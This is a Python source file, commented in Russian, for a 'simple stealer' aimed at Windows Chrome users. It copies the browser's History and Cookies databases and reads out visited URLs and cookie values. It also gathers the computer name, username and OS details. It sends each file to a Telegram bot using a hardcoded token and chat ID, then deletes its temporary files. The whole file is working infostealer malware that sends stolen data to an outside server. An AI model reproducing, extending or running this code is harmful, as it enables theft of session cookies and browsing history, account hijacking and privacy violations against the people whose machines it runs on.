import os
import json
import sqlite3
import shutil
import requests
import platform
import tempfile
from datetime import datetime
import base64

# =============================================================
# SWILL SIMPLE STEALER - Собирает куки и историю браузера
# =============================================================

# ТВОИ ДАННЫЕ ДЛЯ TELEGRAM
BOT_TOKEN = "5952069433:AAFMhvGV6N5pZLcFY12X_vAkxis4Q2by72o"  # Получи у @BotFather
CHAT_ID = "5267511657"   # Получи у @chatIDrobot

# Временная папка для файлов
temp_dir = tempfile.mkdtemp()
collected_data = []

def send_to_telegram(file_path, caption=""):
    """Отправляет файл в Telegram"""
    try:
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': CHAT_ID, 'caption': caption[:1000]}
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
                         files=files, data=data, timeout=10)
    except:
        pass

def get_chrome_data():
    """Собирает куки и историю из Chrome"""
    if platform.system() != "Windows":
        return
    
    # Путь к профилю Chrome
    chrome_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default")
    
    # Копируем файлы (чтобы не блокировать браузер)
    try:
        # История
        history_src = os.path.join(chrome_path, "History")
        if os.path.exists(history_src):
            history_dst = os.path.join(temp_dir, "history.txt")
            shutil.copy2(history_src, os.path.join(temp_dir, "History.db"))
            
            # Читаем историю из SQLite
            conn = sqlite3.connect(os.path.join(temp_dir, "History.db"))
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 50")
            
            with open(history_dst, "w", encoding="utf-8") as f:
                f.write("=== ИСТОРИЯ БРАУЗЕРА ===\n\n")
                for url, title, visit_time in cursor.fetchall():
                    f.write(f"URL: {url}\n")
                    f.write(f"Заголовок: {title}\n")
                    f.write("-" * 50 + "\n")
            
            conn.close()
            collected_data.append(("history.txt", "История Chrome"))
        
        # Куки
        cookies_src = os.path.join(chrome_path, "Cookies")
        if os.path.exists(cookies_src):
            cookies_dst = os.path.join(temp_dir, "cookies.txt")
            shutil.copy2(cookies_src, os.path.join(temp_dir, "Cookies.db"))
            
            conn = sqlite3.connect(os.path.join(temp_dir, "Cookies.db"))
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 100")
            
            with open(cookies_dst, "w", encoding="utf-8") as f:
                f.write("=== COOKIES ===\n\n")
                for host, name, value in cursor.fetchall():
                    f.write(f"Сайт: {host}\n")
                    f.write(f"Имя: {name}\n")
                    f.write(f"Значение: {value[:100]}\n")
                    f.write("-" * 50 + "\n")
            
            conn.close()
            collected_data.append(("cookies.txt", "Куки Chrome"))
            
    except Exception as e:
        pass

def get_system_info():
    """Собирает информацию о системе"""
    info_file = os.path.join(temp_dir, "system.txt")
    
    with open(info_file, "w", encoding="utf-8") as f:
        f.write("=== ИНФОРМАЦИЯ О СИСТЕМЕ ===\n\n")
        f.write(f"Дата и время: {datetime.now()}\n")
        f.write(f"Компьютер: {platform.node()}\n")
        f.write(f"Пользователь: {os.getlogin()}\n")
        f.write(f"ОС: {platform.system()} {platform.version()}\n")
        f.write(f"Архитектура: {platform.machine()}\n")
        f.write(f"Процессор: {platform.processor()}\n")
    
    collected_data.append(("system.txt", "Инфо о системе"))

# =============================================================
# ЗАПУСК
# =============================================================

def main():
    """Главная функция"""
    print("[+] Сбор данных...")
    
    # Собираем инфу
    get_system_info()
    get_chrome_data()
    
    # Отправляем в Telegram
    print(f"[+] Отправка {len(collected_data)} файлов в Telegram...")
    
    for filename, caption in collected_data:
        filepath = os.path.join(temp_dir, filename)
        if os.path.exists(filepath):
            send_to_telegram(filepath, caption)
            print(f"[+] Отправлен: {filename}")
    
    # Чистим за собой
    try:
        shutil.rmtree(temp_dir)
    except:
        pass
    
    print("[+] Готово!")

if __name__ == "__main__":
    main()